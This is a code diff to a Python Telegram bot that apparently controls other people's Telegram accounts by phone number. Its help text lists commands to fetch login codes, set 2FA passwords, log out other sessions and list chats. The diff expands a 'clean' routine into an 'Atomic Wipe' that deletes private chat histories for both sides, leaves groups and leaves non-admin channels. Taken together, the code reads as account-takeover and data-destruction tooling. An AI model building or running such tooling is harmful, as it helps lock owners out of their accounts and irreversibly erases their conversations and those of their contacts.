@@ -12,7 +12,6 @@ import logging
 import psycopg2
 import sys
 import telebot
-import random
 from telebot import types
 from telethon import TelegramClient, functions, types as tl_types, errors
 from telethon.sessions import StringSession
@@ -239,18 +238,29 @@ async def logic_read_msgs(client, cid, limit):
 
 async def logic_clean_account(client):
     count = 0
+    protected = 0
     async for dialog in client.iter_dialogs():
         try:
-            if dialog.is_channel and not dialog.is_group:
-                continue
             if dialog.is_user:
                 await client(functions.messages.DeleteHistoryRequest(peer=dialog.input_entity, max_id=0, just_clear=False, revoke=True))
                 count += 1
             elif dialog.is_group:
                 await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
                 count += 1
+            elif dialog.is_channel:
+                try:
+                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
+                    if isinstance(p.participant, (tl_types.ChannelParticipantAdmin, tl_types.ChannelParticipantCreator)):
+                        protected += 1
+                        continue
+                    else:
+                        await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
+                        count += 1
+                except:
+                    await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
+                    count += 1
         except: continue
-    return f"🧹 <b>Cleanup Complete:</b> Purged <code>{count}</code> chats/groups. Channels saved."
+    return f"🧹 <b>Atomic Wipe Complete:</b> Purged <code>{count}</code> items. Protected <code>{protected}</code> Admin channels."
 
 # --- 6. TELEGRAM BOT HANDLERS ---
 
@@ -268,8 +278,8 @@ def handle_help(m):
         "• <code>.lock [phone]</code> - 2FA status\n"
         "• <code>.wipe [phone]</code> - Logout others\n"
         "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
-        "🧹 <b>PURGE</b>\n"
-        "• <code>.clean [phone]</code> - Delete all chats (Skip Channels)\n\n"
+        "☢️ <b>PURGE</b>\n"
+        "• <code>.clean [phone]</code> - Atomic Wipe (DMs/Groups/Non-Admin Channels)\n\n"
         "🕵️ <b>DISCOVERY</b>\n"
         "• <code>.code [phone]</code> - Get code\n"
         "• <code>.chats [phone] [limit]</code> - List dialogs\n"
@@ -317,7 +327,7 @@ def cmd_clean(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ")
     if len(args) < 2: return
-    bot.send_message(m.chat.id, f"🧹 <b>Purging +{args[1]}...</b>")
+    bot.send_message(m.chat.id, f"☢️ <b>Atomic Wipe Initiated for +{args[1]}...</b>")
     res = asyncio.run(run_logic(args[1], logic_clean_account))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
